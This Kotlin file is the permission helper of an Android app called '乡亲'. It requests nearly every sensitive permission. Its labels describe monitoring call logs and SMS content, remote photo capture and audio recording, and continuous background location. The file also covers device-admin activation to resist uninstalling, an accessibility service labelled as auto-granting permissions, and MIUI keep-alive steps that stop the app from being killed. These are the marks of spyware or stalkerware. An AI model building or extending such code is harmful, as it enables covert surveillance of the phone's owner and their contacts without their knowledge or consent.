package com.xiangqin.app.util

import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Process
import android.provider.Settings
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat

/**
 * 权限管理助手
 * 统一处理运行时权限 + 特殊权限 + MIUI 专属设置引导
 *
 * 全面覆盖 Android 所有权限组，支持小米 13 Pro (HyperOS / Android 14)
 */
object PermissionHelper {

    // ====================== 运行时权限列表（按组） ======================

    /** 通话记录 */
    private val callLogPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(Manifest.permission.READ_CALL_LOG)
    } else {
        listOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE)
    }

    /** 短信 */
    private val smsPermissions = listOf(Manifest.permission.READ_SMS)

    /** 联系人 */
    private val contactsPermissions = listOf(Manifest.permission.READ_CONTACTS)

    /** 通知（Android 13+ 运行时） */
    private val notificationPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        emptyList()
    }

    /** 位置 */
    private val locationPermissions = listOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    )

    private val backgroundLocationPermissions = listOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)

    /** 📸 相机 */
    private val cameraPermissions = listOf(Manifest.permission.CAMERA)

    /** 🎤 麦克风 */
    private val microphonePermissions = listOf(Manifest.permission.RECORD_AUDIO)

    /** 📅 日历 */
    private val calendarPermissions = listOf(Manifest.permission.READ_CALENDAR)

    /** 💪 身体传感器 */
    private val bodySensorsPermissions = listOf(Manifest.permission.BODY_SENSORS)

    /** 🏃 活动识别 */
    private val activityRecognitionPermissions = listOf(Manifest.permission.ACTIVITY_RECOGNITION)

    /** 📞 电话扩展 */
    private val phoneExtendedPermissions = listOf(
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.ADD_VOICEMAIL,
        Manifest.permission.ANSWER_PHONE_CALLS,
        Manifest.permission.ACCEPT_HANDOVER,
    )

    /** 📡 蓝牙/附近设备 */
    private val bluetoothPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        listOf(
            Manifest.permission.BLUETOOTH_SCAN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_ADVERTISE,
        )
    } else {
        listOf(Manifest.permission.BLUETOOTH, Manifest.permission.BLUETOOTH_ADMIN)
    }

    /** 📶 附近 WiFi */
    private val nearbyWifiPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(Manifest.permission.NEARBY_WIFI_DEVICES)
    } else {
        emptyList()
    }

    /** 🖼️ 媒体 (Android 13+) */
    private val mediaPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        listOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
        )
    } else {
        emptyList()
    }

    /** 悬浮窗 */
    private val overlayPermission = listOf(Manifest.permission.SYSTEM_ALERT_WINDOW)

    /** 所有需要在 Activity 中用 requestPermissions 申请的运行时权限 */
    val allRuntimePermissions: List<String> by lazy {
        buildList {
            addAll(callLogPermissions)
            addAll(smsPermissions)
            addAll(contactsPermissions)
            addAll(notificationPermissions)
            addAll(locationPermissions)
            addAll(cameraPermissions)
            addAll(microphonePermissions)
            addAll(calendarPermissions)
            addAll(bodySensorsPermissions)
            addAll(activityRecognitionPermissions)
            addAll(phoneExtendedPermissions)
            addAll(bluetoothPermissions)
            addAll(nearbyWifiPermissions)
            addAll(mediaPermissions)
            addAll(overlayPermission)
        }
    }

    /** 运行时权限中文名称映射 */
    val permissionDisplayNames: Map<String, String> by lazy {
        mapOf(
            Manifest.permission.READ_CALL_LOG to "通话记录",
            Manifest.permission.READ_PHONE_STATE to "电话状态",
            Manifest.permission.READ_SMS to "短信",
            Manifest.permission.READ_CONTACTS to "联系人",
            Manifest.permission.POST_NOTIFICATIONS to "通知",
            Manifest.permission.ACCESS_FINE_LOCATION to "精确定位",
            Manifest.permission.ACCESS_COARSE_LOCATION to "粗略定位",
            Manifest.permission.ACCESS_BACKGROUND_LOCATION to "后台定位",
            Manifest.permission.CAMERA to "相机",
            Manifest.permission.RECORD_AUDIO to "麦克风",
            Manifest.permission.READ_CALENDAR to "日历",
            Manifest.permission.BODY_SENSORS to "身体传感器",
            Manifest.permission.ACTIVITY_RECOGNITION to "活动识别",
            Manifest.permission.ADD_VOICEMAIL to "语音邮件",
            Manifest.permission.ANSWER_PHONE_CALLS to "接听电话",
            Manifest.permission.ACCEPT_HANDOVER to "通话移交",
            Manifest.permission.BLUETOOTH_SCAN to "蓝牙扫描",
            Manifest.permission.BLUETOOTH_CONNECT to "蓝牙连接",
            Manifest.permission.BLUETOOTH_ADVERTISE to "蓝牙广播",
            Manifest.permission.NEARBY_WIFI_DEVICES to "附近WiFi设备",
            Manifest.permission.READ_MEDIA_IMAGES to "媒体图片",
            Manifest.permission.READ_MEDIA_VIDEO to "媒体视频",
            Manifest.permission.READ_MEDIA_AUDIO to "媒体音频",
            Manifest.permission.SYSTEM_ALERT_WINDOW to "悬浮窗",
        )
    }

    // ====================== 特殊权限检测 ======================

    /** 是否有使用情况访问权限（PACKAGE_USAGE_STATS） */
    fun hasUsageStatsPermission(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = try {
            // checkOpNoThrow 在 API 29+ 已废弃，改用 checkOp（需捕获 SecurityException）
            @Suppress("DEPRECATION")
            appOps.checkOp(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName
            )
        } catch (_: SecurityException) {
            AppOpsManager.MODE_DEFAULT
        }
        return when (mode) {
            AppOpsManager.MODE_ALLOWED -> true
            AppOpsManager.MODE_DEFAULT -> {
                ContextCompat.checkSelfPermission(
                    context, Manifest.permission.PACKAGE_USAGE_STATS
                ) == PackageManager.PERMISSION_GRANTED
            }
            else -> false
        }
    }

    /** 打开「使用情况访问权限」设置页 */
    fun openUsageStatsSettings(context: Context) {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /** 是否已忽略电池优化 */
    fun hasBatteryOptimizationExempted(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isIgnoringBatteryOptimizations(context.packageName)
    }

    /** 打开「忽略电池优化」设置页 */
    fun openBatteryOptimizationSettings(context: Context) {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /** 通知权限是否已授予（Android 13+） */
    fun hasNotificationPermission(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return true
        return NotificationManagerCompat.from(context).areNotificationsEnabled()
    }

    /** 打开通知权限设置页 */
    fun openNotificationSettings(context: Context) {
        val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
            putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /** 打开应用详情设置 */
    fun openAppDetailsSettings(context: Context) {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    // ====================== 设备管理器 ======================

    /** 设备管理器是否已激活 */
    fun isDeviceAdmin(context: Context): Boolean {
        return com.xiangqin.app.receiver.XiangQinDeviceAdminReceiver.isActive(context)
    }

    /** 打开设备管理器激活页面 */
    fun openDeviceAdminSettings(context: Context) {
        com.xiangqin.app.receiver.XiangQinDeviceAdminReceiver.openActivation(context)
    }

    // ====================== 精确闹钟 ======================

    /** 精确闹钟权限（Android 12+） */
    fun hasExactAlarmPermission(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return true
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        return alarmManager.canScheduleExactAlarms()
    }

    /** 打开精确闹钟设置页 */
    fun openExactAlarmSettings(context: Context) {
        val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            context.startActivity(intent)
        } catch (_: Exception) {
            openAppDetailsSettings(context)
        }
    }

    // ====================== 安装未知应用 ======================

    /** 是否有安装未知应用的权限 */
    fun hasInstallPackagesPermission(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return true
        return context.packageManager.canRequestPackageInstalls()
    }

    /** 打开安装未知应用设置 */
    fun openInstallPackagesSettings(context: Context) {
        val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /** 是否有管理所有文件的权限（Android 11+） */
    fun hasManageStoragePermission(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
        return Environment.isExternalStorageManager()
    }

    /** 打开管理所有文件设置 */
    fun openManageStorageSettings(context: Context) {
        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            context.startActivity(intent)
        } catch (_: Exception) {
            openAppDetailsSettings(context)
        }
    }

    // ====================== MIUI 专属引导 ======================

    data class MiuiPermissionInfo(
        val name: String,
        val description: String,
        val isGranted: Boolean,
        val actionLabel: String,
        val action: () -> Unit
    )

    /** 获取 MIUI 保活相关权限状态列表 */
    fun getMiuiPermissions(context: Context): List<MiuiPermissionInfo> {
        return listOf(
            // --- 📞 通话 & 短信 & 联系人 (核心监控) ---
            MiuiPermissionInfo(
                "通话记录", "读取通话记录以监控通话情况",
                hasCallLogPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "短信", "读取短信以监控短信内容",
                hasSmsPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "联系人", "读取联系人显示来电/短信姓名",
                hasContactsPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "电话状态", "获取电话基本信息（号码、状态等）",
                hasPhoneStatePermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 📍 位置 ---
            MiuiPermissionInfo(
                "位置权限", "用于WiFi定位、蓝牙扫描和网络信息获取（精确+粗略）",
                hasLocationPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "后台定位", "后台持续获取位置信息",
                hasBackgroundLocationPermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 📸 相机 & 麦克风 ---
            MiuiPermissionInfo(
                "相机", "远程拍照、扫码等功能",
                hasCameraPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "麦克风", "远程录音、语音识别等功能",
                hasMicrophonePermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 📅 日历 & 传感器 ---
            MiuiPermissionInfo(
                "日历", "读取日历事件",
                hasCalendarPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "身体传感器", "读取计步器、心率等传感器数据",
                hasBodySensorsPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "活动识别", "识别用户运动状态（步行、跑步、骑行等）",
                hasActivityRecognitionPermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 📡 蓝牙 & 附近设备 ---
            MiuiPermissionInfo(
                "蓝牙/附近设备", "扫描和连接附近蓝牙设备",
                hasBluetoothPermission(context),
                "去授权", { openAppDetails(context) }
            ),
            MiuiPermissionInfo(
                "附近WiFi", "发现附近WiFi设备信息",
                hasNearbyWifiPermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 🖼️ 媒体 ---
            MiuiPermissionInfo(
                "媒体文件", "读取图片、视频、音频文件",
                hasMediaPermission(context),
                "去授权", { openAppDetails(context) }
            ),

            // --- 特殊权限 ---
            MiuiPermissionInfo(
                "使用情况访问", "获取应用使用时长和流量统计",
                hasUsageStatsPermission(context),
                "去设置", { openUsageStatsSettings(context) }
            ),
            MiuiPermissionInfo(
                "忽略电池优化", "防止系统休眠时停止监控",
                hasBatteryOptimizationExempted(context),
                "去设置", { openBatteryOptimizationSettings(context) }
            ),
            MiuiPermissionInfo(
                "通知权限", "显示监控状态通知",
                hasNotificationPermission(context),
                "去开启", { openNotificationSettings(context) }
            ),
            MiuiPermissionInfo(
                "自启动", "开机自动启动监控（MIUI 需手动允许）",
                false, // 无法代码检测，直接显示引导
                "去设置", {
                    val intent = Intent().apply {
                        action = "miui.intent.action.OP_AUTO_START"
                        addCategory(Intent.CATEGORY_DEFAULT)
                        putExtra("packageName", context.packageName)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    try {
                        context.startActivity(intent)
                    } catch (_: Exception) {
                        openAppDetails(context)
                    }
                }
            ),
            MiuiPermissionInfo(
                "设备管理器", "激活后可防止应用被误卸载，并支持远程锁屏",
                isDeviceAdmin(context),
                "去激活", { openDeviceAdminSettings(context) }
            ),
            MiuiPermissionInfo(
                "悬浮窗", "可在其他应用上层显示信息",
                hasOverlayPermission(context),
                "去授权", { openOverlaySettings(context) }
            ),
            MiuiPermissionInfo(
                "管理所有文件", "访问手机全部存储文件（导出数据必需）",
                hasManageStoragePermission(context),
                "去设置", { openManageStorageSettings(context) }
            ),
            MiuiPermissionInfo(
                "精确闹钟", "确保定时任务准时执行",
                hasExactAlarmPermission(context),
                "去设置", { openExactAlarmSettings(context) }
            ),
            MiuiPermissionInfo(
                "安装未知应用", "允许应用安装更新包",
                hasInstallPackagesPermission(context),
                "去设置", { openInstallPackagesSettings(context) }
            ),
        )
    }

    /** MIUI 保活引导文字 */
    fun getMiuiKeepAliveGuide(): String = buildString {
        appendLine("📱 MIUI / HyperOS 保活设置指南：\n")
        appendLine("1. 打开「设置」→「应用」→「应用管理」→ 找到「乡亲」")
        appendLine("2. 开启「自启动」")
        appendLine("3. 进入「省电策略」，选择「无限制」")
        appendLine("4. 返回「设置」→「电池与性能」→「应用配置」→ 找到「乡亲」→ 选择「无限制」")
        appendLine("5. 在最近任务列表中，将「乡亲」下拉锁定")
        appendLine("6. 进入「设置」→「通知与控制中心」→「通知管理」→ 找到「乡亲」→ 开启所有通知")
        appendLine("7. 进入「设置」→「安全」→「设备管理器」→ 勾选「乡亲」→ 激活")
        appendLine("   （激活后可防止应用被误卸载）")
        appendLine("\\n以上步骤完成后，后台服务将更加稳定运行。")
    }

    // ====================== 内部方法 ======================

    private fun hasCallLogPermission(context: Context): Boolean {
        return callLogPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasSmsPermission(context: Context): Boolean {
        return smsPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasContactsPermission(context: Context): Boolean {
        return contactsPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasPhoneStatePermission(context: Context): Boolean {
        val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_PHONE_STATE
        } else {
            Manifest.permission.READ_PHONE_STATE
        }
        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasLocationPermission(context: Context): Boolean {
        return locationPermissions.any {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasBackgroundLocationPermission(context: Context): Boolean {
        return backgroundLocationPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasCameraPermission(context: Context): Boolean {
        return cameraPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasMicrophonePermission(context: Context): Boolean {
        return microphonePermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasCalendarPermission(context: Context): Boolean {
        return calendarPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasBodySensorsPermission(context: Context): Boolean {
        return bodySensorsPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasActivityRecognitionPermission(context: Context): Boolean {
        return activityRecognitionPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasBluetoothPermission(context: Context): Boolean {
        return bluetoothPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasNearbyWifiPermission(context: Context): Boolean {
        if (nearbyWifiPermissions.isEmpty()) return true
        return nearbyWifiPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasMediaPermission(context: Context): Boolean {
        if (mediaPermissions.isEmpty()) {
            // Android 12 及以下，用 READ_EXTERNAL_STORAGE
            return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        return mediaPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun hasOverlayPermission(context: Context): Boolean {
        return Settings.canDrawOverlays(context)
    }

    private fun openOverlaySettings(context: Context) {
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /** 无障碍服务是否已启用 */
    fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val service = ComponentName(context, com.xiangqin.app.service.PermissionAccessibilityService::class.java)
        val enabledServices = try {
            Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
        } catch (_: Exception) { "" }
        return enabledServices.split(':').any { it.contains(service.flattenToShortString()) }
    }

    /** 打开无障碍设置页 */
    fun openAccessibilitySettings(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {
            // 部分 MIUI 无障碍入口不一样
            try {
                val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS").apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {
                openAppDetails(context)
            }
        }
    }

    /** 自动授权的无障碍服务名称（用于引导） */
    fun getAccessibilityServiceLabel(): String = "乡亲（权限自动授权）"

    // ====================== MIUI 保活专属引导 ======================

    /** MIUI 保活设置项 */
    data class KeepAliveItem(
        val icon: String,
        val title: String,
        val description: String,
        val statusText: String,
        val isDone: Boolean,
        val actionLabel: String,
        val action: () -> Unit
    )

    /** 获取 MIUI 保活关键步骤列表 */
    fun getMiuiKeepAliveItems(context: Context): List<KeepAliveItem> {
        return listOf(
            // 1. 自启动
            KeepAliveItem(
                icon = "🚀",
                title = "自启动权限",
                description = "允许系统开机/被杀后自动重启乡亲",
                statusText = "建议开启",
                isDone = false, // 无法代码检测
                actionLabel = "去设置",
                action = { openMiuiAutostart(context) }
            ),
            // 2. 省电策略 → 无限制
            KeepAliveItem(
                icon = "🔋",
                title = "省电策略 — 无限制",
                description = "防止 MIUI 在后台休眠时杀掉服务",
                statusText = if (hasBatteryOptimizationExempted(context)) "已无限制" else "默认限制",
                isDone = hasBatteryOptimizationExempted(context),
                actionLabel = "去设置",
                action = { openMiuiPowerKeeper(context) }
            ),
            // 3. 锁后台
            KeepAliveItem(
                icon = "🔒",
                title = "锁定最近任务",
                description = "在多任务界面下拉锁定乡亲，防一键清理",
                statusText = "需手动操作",
                isDone = false,
                actionLabel = "查看方法",
                action = {
                    openMiuiLockAppGuide(context)
                }
            ),
            // 4. 精确闹钟
            KeepAliveItem(
                icon = "⏰",
                title = "精确闹钟权限",
                description = "确保保活看门狗准时唤醒检测",
                statusText = if (hasExactAlarmPermission(context)) "已授权" else "未授权",
                isDone = hasExactAlarmPermission(context),
                actionLabel = "去设置",
                action = { openExactAlarmSettings(context) }
            ),
            // 5. 设备管理器（防卸载）
            KeepAliveItem(
                icon = "🛡️",
                title = "设备管理器（防卸载）",
                description = "激活后卸载前必须停用，防止误卸载。还支持远程锁屏",
                statusText = if (isDeviceAdmin(context)) "已激活" else "未激活",
                isDone = isDeviceAdmin(context),
                actionLabel = "去激活",
                action = { openDeviceAdminSettings(context) }
            ),
        )
    }

    /** 打开 MIUI 自启动设置 */
    private fun openMiuiAutostart(context: Context) {
        try {
            val intent = Intent("miui.intent.action.OP_AUTO_START").apply {
                addCategory(Intent.CATEGORY_DEFAULT)
                putExtra("packageName", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {
            try {
                // MIUI 14+ 路径
                val intent = Intent().apply {
                    `package` = "com.miui.securitycenter"
                    action = "miui.intent.action.OP_AUTO_START"
                    addCategory(Intent.CATEGORY_DEFAULT)
                    putExtra("packageName", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {
                openAppDetails(context)
            }
        }
    }

    /** 打开 MIUI 省电策略页面（PowerKeeper） */
    private fun openMiuiPowerKeeper(context: Context) {
        try {
            // 1. 先尝试直接打开电池优化豁免设置（通用方案）
            openBatteryOptimizationSettings(context)
        } catch (_: Exception) {
            try {
                // 2. MIUI 专用：打开 PowerKeeper 应用省电详情
                val intent = Intent("miui.intent.action.POWER_KEEPER").apply {
                    putExtra("package_name", context.packageName)
                    putExtra("package", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {
                try {
                    // 3. 直接打开安全中心的省电页面
                    val intent = context.packageManager.getLaunchIntentForPackage("com.miui.powerkeeper")
                    if (intent != null) {
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                    } else {
                        openAppDetails(context)
                    }
                } catch (_: Exception) {
                    openAppDetails(context)
                }
            }
        }
    }

    /** 打开 MIUI 锁后台引导 — 用 Toast/对话框提示用户手动操作 */
    private fun openMiuiLockAppGuide(context: Context) {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
        // 提示信息由调用方以 Toast/Snackbar 形式展示
    }

    /** 锁后台操作提示文字 */
    fun getLockAppGuideText(): String =
        "🔒 锁定最近任务步骤：\n\n" +
        "1. 点击导航栏「最近任务」按钮（或从底部上滑并停住）\n" +
        "2. 找到「乡亲」卡片\n" +
        "3. 按住卡片向下拉，直到出现「🔒 锁定」图标\n" +
        "4. 之后一键清理不会关掉乡亲\n\n" +
        "💡 锁定后通知栏图标会一直显示，这是正常现象"

    /** 保活状态摘要 */
    fun getKeepAliveSummary(context: Context): String {
        val items = getMiuiKeepAliveItems(context)
        val doneCount = items.count { it.isDone }
        return "$doneCount/${items.size} 项已配置"
    }

    private fun openAppDetails(context: Context) {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }
}
